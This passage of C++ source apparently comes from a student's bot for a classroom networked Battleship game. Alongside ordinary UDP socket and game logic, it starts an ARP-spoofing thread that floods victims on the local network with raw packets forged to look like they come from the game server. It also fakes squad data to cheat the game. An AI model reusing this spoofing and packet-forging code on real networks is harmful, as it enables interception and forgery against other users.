2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | BIT,OF,TEXT,FOR,BANTER";
	int		cmdLength = strlen((char*)cmd);
	
	// > Start the attack now that we're ARP Spoofing
	// -> We can make use of "pcap_sendpacket" now to send packets
	while (isArping)
	{
		for (i = 0; i < ipCount; i++)
		{
			// > Send our packet to our victim
			RawPacket RP;
			RP.CreatePacket(srv_mac, spoofData[i].mac, ARP_SERVER_IP, spoofData[i].ip, 60666, 1925, cmd, cmdLength);
			RP.SendPacket(adhandle);
		}
	}
}
#pragma endregion

#pragma region Communications & Sockets
// Name:  handleBufferData(char* buf);
// Args:  1
// Desc:  Handles server and ally data, and merges it together.
void handleBufferData(char* buffer, char* addr_ip)
{
	// > Variables
	char chr;
	char allySendBuffer[4096];
	int  i = 0;
	int  j = 0;
	bool finished = false;
	bool recvAllyData = false;
	bool recvServerData = false;
	bool recvMsgData = false;

	// > Check if we're receiving a message
	if (buffer[0] == 'M')
	{
		messageReceived(buffer);
		recvMsgData = true;
	}
	// > Check if we're receiving ally data (SQUAD)
	else if (buffer[0] == 'S' && buffer[1] == 'Q' && buffer[2] == 'U' && buffer[3] == 'A' && buffer[4] == 'D')
	{
		// > So far so good... our starting buffer is 'SQUAD', does our buffer contain our ending symbol ($)?
		while ((!finished) && (i < 4096))
		{
			if (buffer[i] == '$')
			{
				finished = true;
				recvAllyData = true;
				break;
			}
			i++;
		}
	}
	// > Check if we're receiving server data
	else recvServerData = true;

	// > Handle our ally data
	if (recvAllyData)
	{
		// > Handle our allies data
		if (strcmp(JONAS_IPADDRESS, addr_ip) == 0) handleAlly(JONAS, buffer);
		else if (strcmp(CHRIS_IPADDRESS, addr_ip) == 0) handleAlly(CHRIS, buffer);
		else if (strcmp(HARRY_IPADDRESS, addr_ip) == 0) handleAlly(HARRY, buffer);
		else											handleAlly(UNKNOWN, buffer);
	}
	// > Handle our server data
	else if (recvServerData)
	{
		// > Clear our struct
		emptyShipStruct();
		number_of_ships = 0;
		number_of_enemies = 0;

		while ((!finished) && (i<4096))
		{
			chr = buffer[i];

			switch (chr)
			{
				case '|':
					InputBuffer[j] = '\0';
					j = 0;

					// > Add our ship to the structure
					sscanf_s(InputBuffer, "%d,%d,%d,%d,%d", &shipStruct[number_of_ships].x, &shipStruct[number_of_ships].y, &shipStruct[number_of_ships].health, &shipStruct[number_of_ships].flag, &shipStruct[number_of_ships].type);

					// > Update the rest of our data
					shipStruct[number_of_ships].index = number_of_ships;
					shipStruct[number_of_ships].distance = getDistance(shipStruct[number_of_ships].x, shipStruct[number_of_ships].y);
					shipStruct[number_of_ships].ally = decryptFlag(shipStruct[number_of_ships].flag, shipStruct[number_of_ships].x, shipStruct[number_of_ships].y);
					shipStruct[number_of_ships].isbattleship = (shipStruct[number_of_ships].type == 0 ? true : false);

					// > Flag change fix
					if (shipStruct[number_of_ships].index == 0)
						shipStruct[number_of_ships].ally = true;

					number_of_ships++;
					break;

				case '\0':
					InputBuffer[j] = '\0';

					// > Add our ship to the structure
					sscanf_s(InputBuffer, "%d,%d,%d,%d,%d", &shipStruct[number_of_ships].x, &shipStruct[number_of_ships].y, &shipStruct[number_of_ships].health, &shipStruct[number_of_ships].flag, &shipStruct[number_of_ships].type);

					// > Update the rest of our data
					shipStruct[number_of_ships].index = number_of_ships;
					shipStruct[number_of_ships].distance = getDistance(shipStruct[number_of_ships].x, shipStruct[number_of_ships].y);
					shipStruct[number_of_ships].ally = decryptFlag(shipStruct[number_of_ships].flag, shipStruct[number_of_ships].x, shipStruct[number_of_ships].y);
					shipStruct[number_of_ships].isbattleship = (shipStruct[number_of_ships].type == 0 ? true : false);

					// > Flag change fix
					if (shipStruct[number_of_ships].index == 0)
						shipStruct[number_of_ships].ally = true;

					number_of_ships++;
					finished = true;
					break;

				default:
					InputBuffer[j] = chr;
					j++;
					break;
			}
			i++;
		}

		// > Update our ship and update counters
		for (int s = 0; s < number_of_ships; s++)
		{
			// > Update our ship
			if (shipStruct[s].index == 0)
				me = shipStruct[s];
			else
				// > Update our counters
			if (!shipStruct[s].ally)
				number_of_enemies++;
		}

		// > Send our allies our updated information
		// -> Set our fake health to 11 to become the leader of the pack
		sprintf_s(allySendBuffer, "SQUAD %d,%d,%d,%d,%d,%d $", me.x, me.y, me.health, getEncryptedFlag(), me.type, number_of_enemies);
		for (int a = 0; a < MAX_ALLIES; a++)
		{
			// > Forward our data to the ally
			if (sendto(sock_send, allySendBuffer, strlen(allySendBuffer), 0, (SOCKADDR *)&allyaddr[a], sizeof(SOCKADDR)) < 0)
				update(24, " > [ALLY] Failed to send data to %s!", allyArray[a].name);
		}
	}
	// > Handle our message data
	else if (recvMsgData) return;
}

// Name:  setupComms();
// Args:  N/A
// Desc:  We will initiate communications with the Battleship Server
void setupComms()
{
	// > Variables
	char buffer[4096], *addr_ip;
	int  len = sizeof(SOCKADDR);

	// > Register our communication to the server
	sprintf_s(buffer, "Register  %s,%s,%s,%s", STUDENT_NUMBER, STUDENT_FIRSTNAME, STUDENT_FAMILYNAME, MY_SHIP);
	sendto(sock_send, buffer, strlen(buffer), 0, (SOCKADDR *)&sendto_addr, sizeof(SOCKADDR));

	// > Set our firing distance
	switch (me.type)
	{
	case 0:		firingDistance = 100;	break;
	case 1:		firingDistance = 75;	break;
	case 2:		firingDistance = 50;	break;
	default:	firingDistance = 0;		break;
	}

	// > Receive data from the server
	while (true)
	{
		// > If we're receiving data from the server, read it
		if (recvfrom(sock_recv, buffer, sizeof(buffer)-1, 0, (SOCKADDR *)&receive_addr, &len) != SOCKET_ERROR)
		{
			// > Get the IP address from the sender
			addr_ip = ::inet_ntoa(receive_addr.sin_addr);

			// > Check that the IP address is a valid server
			if (
				// > Check for the server sending us data
				(strcmp(IP_ADDRESS_SERVER, "127.0.0.1") == 0) ||		// < Check if the local server is sending us data
				(strcmp(IP_ADDRESS_SERVER, addr_ip) == 0) ||		// < Check if the server is sending us data

				// > Check for allies sending us data
				(strcmp(JONAS_IPADDRESS, addr_ip) == 0) ||		// < Jonas IP Check
				(strcmp(CHRIS_IPADDRESS, addr_ip) == 0) ||		// < Chris IP Check
				(strcmp(HARRY_IPADDRESS, addr_ip) == 0)			// < Harry IP Check
				)
			{
				// > Handle our buffer data
				handleBufferData(buffer, addr_ip);

				// > Initialise our bots tactics
				play();

				// > Identify our bots state
				char* state;
				if (fire && moveShip && setFlag)	state = "Firing, Moving Ship and Setting Flag";
				else if (fire && moveShip)				state = "Firing and Moving";
				else if (fire && setFlag)				state = "Firing and Setting Flag";
				else if (moveShip && setFlag)			state = "Moving Ship and Setting Flag";
				else if (fire)							state = "Firing";
				else if (moveShip)						state = "Moving Ship";
				else if (setFlag)						state = "Setting Flag";
				else									state = "Idle";

				// > Check if we're firing
				// -> Prioritise our firing command
				if (fire)
				{
					sprintf_s(buffer, "Fire %s,%d,%d", STUDENT_NUMBER, fireX, fireY);
					sendto(sock_send, buffer, strlen(buffer), 0, (SOCKADDR *)&sendto_addr, sizeof(SOCKADDR));
					fire = false;
				}

				// > Check if we're sending a message
				if (message)
				{
					sendto(sock_send, MsgBuffer, strlen(MsgBuffer), 0, (SOCKADDR *)&sendto_addr, sizeof(SOCKADDR));
					message = false;
				}

				// > Check if we're moving
				if (moveShip)
				{
					sprintf_s(buffer, "Move %s,%d,%d", STUDENT_NUMBER, moveX, moveY);
					sendto(sock_send, buffer, strlen(buffer), 0, (SOCKADDR *)&sendto_addr, sizeof(SOCKADDR));
					moveShip = false;
				}

				// > Check if we're setting a flag
				if (setFlag)
				{
					sprintf_s(buffer, "Flag %s,%d", STUDENT_NUMBER, new_flag);
					sendto(sock_send, buffer, strlen(buffer), 0, (SOCKADDR *)&sendto_addr, sizeof(SOCKADDR));
					setFlag = false;
				}

				// > Update our user interface
				updateBotInfo(STUDENT_NUMBER, me.x, me.y, me.health, state, me.flag);
				updateShipInfo(number_of_ships, number_of_enemies, number_of_friends);

				// > Update our console title
				string titleStr = string("Battleship Bots | " + to_string(me.health * 10) + "% Health | X: " + to_string(me.x) + " Y: " + to_string(me.y) + " | Enemies In Sight: " + to_string(number_of_enemies) + " | Friendlies In Sight: " + to_string(number_of_friends));
				std::wstring stemp = s2ws(titleStr);
				LPCWSTR title = stemp.c_str();
				SetConsoleTitle(title);
			}
		}
		else update(30, " > [RECV] Error = %d", WSAGetLastError());
	}
}

// Name:  setupSockets();
// Args:  N/A
// Desc:  This function sets up the sockets to the Battleship Server.
int setupSockets()
{
	// > Initialise 'wdata' variable
	if (WSAStartup(MAKEWORD(2, 2), &wdata) != 0) return 0;

	// > Setup other ally sockets
	setupAllies();

	// > Setup SEND Socket
	// -> Here we create our socket, which will be a UDP socket (SOCK_DGRAM).
	sock_send = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (!sock_send)
		update(0, " > [SOCK] Socket creation failed for 'send'!");

	// > Setup RECV Socket
	// -> Here we create our socket, which will be a UDP socket (SOCK_DGRAM).
	sock_recv = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (!sock_recv)
		update(0, " > [SOCK] Socket creation failed for 'recv'!");

	// > Setup SEND Socket
	memset(&sendto_addr, 0, sizeof(SOCKADDR_IN));
	sendto_addr.sin_family = AF_INET;
	sendto_addr.sin_addr.s_addr = inet_addr(IP_ADDRESS_SERVER);
	sendto_addr.sin_port = htons(PORT_SEND);

	// > Setup RECV Socket
	memset(&receive_addr, 0, sizeof(SOCKADDR_IN));
	receive_addr.sin_family = AF_INET;
	receive_addr.sin_addr.s_addr = INADDR_ANY; //inet_addr(IP_ADDRESS_SERVER); // > We only want to listen to commands from the server
	receive_addr.sin_port = htons(PORT_RECEIVE);

	// > Bind our sockets
	int recvSock = ::bind(sock_recv, (SOCKADDR *)&receive_addr, sizeof(SOCKADDR));
	if (recvSock)
		update(0, " > Bind failed! %d", WSAGetLastError());

	return 0;
}

// Name:  closeSockets();
// Args:  N/A
// Desc:  Close the sockets (cleanup)
void closeSockets()
{
	// > Close our open sockets
	closesocket(sock_send);
	closesocket(sock_recv);
	WSACleanup();
}

// Name:  listenToKeyboard();
// Args:  N/A
// Desc:  Listens for keyboard input.
void listenToKeyboard()
{
	char extraBuffer[4096];
	for (;;)
	{
		while (_kbhit())
		{
			switch (tolower(_getch()))
			{
				// > Respawn
				case 'r':
					shouldWeRespawn = true;
					MessageBoxA(NULL, "Respawning our bot", "Respawn", MB_OK);
					break;

				// > Respawn as a battleship
				case 'b':
					sprintf_s(extraBuffer, "Register  %s,%s,%s,%s", STUDENT_NUMBER, STUDENT_FIRSTNAME, STUDENT_FAMILYNAME, SHIPTYPE_BATTLESHIP);
					sendto(sock_send, extraBuffer, strlen(extraBuffer), 0, (SOCKADDR *)&sendto_addr, sizeof(SOCKADDR));
					break;

				// > Respawn as a frigate
				case 'n':
					sprintf_s(extraBuffer, "Register  %s,%s,%s,%s", STUDENT_NUMBER, STUDENT_FIRSTNAME, STUDENT_FAMILYNAME, SHIPTYPE_FRIGATE);
					sendto(sock_send, extraBuffer, strlen(extraBuffer), 0, (SOCKADDR *)&sendto_addr, sizeof(SOCKADDR));
					break;

				// > Respawn as a submarine
				case 'm':
					sprintf_s(extraBuffer, "Register  %s,%s,%s,%s", STUDENT_NUMBER, STUDENT_FIRSTNAME, STUDENT_FAMILYNAME, SHIPTYPE_SUBMARINE);
					sendto(sock_send, extraBuffer, strlen(extraBuffer), 0, (SOCKADDR *)&sendto_addr, sizeof(SOCKADDR));
					break;

				// > Movement
				case 'w':
					forceMove[0] = true;
					forceMove[1] = false;
					break;
				case 's':
					forceMove[1] = true;
					forceMove[0] = false;
					break;
				case 'a':
					forceMove[2] = true;
					forceMove[3] = false;
					break;
				case 'd':
					forceMove[3] = true;
					forceMove[2] = false;
					break;
				case 'e':
					forcedMovement = !forcedMovement;
					update(34, " > Forced movement has been %s.       ", (forcedMovement ? "enabled" : "disabled"));
					break;
			}
		}

		// > Sleep so we don't freeze/lock the thread
		Sleep(1);
	}
}

// Name:  maximizeConsole();
// Args:  N/A
// Desc:  This will maximize and move the default Win32 console to the top left 
void maximizeConsole()
{
	HWND consoleWind = GetConsoleWindow();
	CONSOLE_SCREEN_BUFFER_INFO info;
	GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &info);
	SMALL_RECT rc;

	rc.Left = rc.Top = 0;
	rc.Right = (short)(min(info.dwMaximumWindowSize.X, info.dwSize.X) - 1);
	rc.Bottom = (short)(min(info.dwMaximumWindowSize.Y, info.dwSize.Y) - 1);
	SetConsoleWindowInfo(GetStdHandle(STD_OUTPUT_HANDLE), true, &rc);
	SetWindowPos(consoleWind, 0, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
}

// Name:  _tmain(int argc, _TCHAR* argv[]);
// Args:  2
// Desc:  This is the entry point of the program
int _tmain(int argc, _TCHAR* argv[])
{
	// > This character will keep the program alive
	char chr = '\0';

	// > Maximize our console window
	maximizeConsole();

	// > Begin by displaying our ASCII Art
	displayHeaderText();

	// > Take input from keyboard
	std::thread t1(listenToKeyboard);

	// > Setup ARP Spoofing
	std::thread t2(setupArp);

	// > Setup our sockets
	setupSockets();

	// > Setup our communications
	setupComms();

	// > Detach from all of our dummy bots threads
	for (auto & th : bot_threads)
		th.join();

	// > Clean up
	t2.join();
	t1.join();
	closeSockets();

	// > Keep the program alive
	while (chr != '\n') chr = getchar();
	return 0;
}
#pragma endregion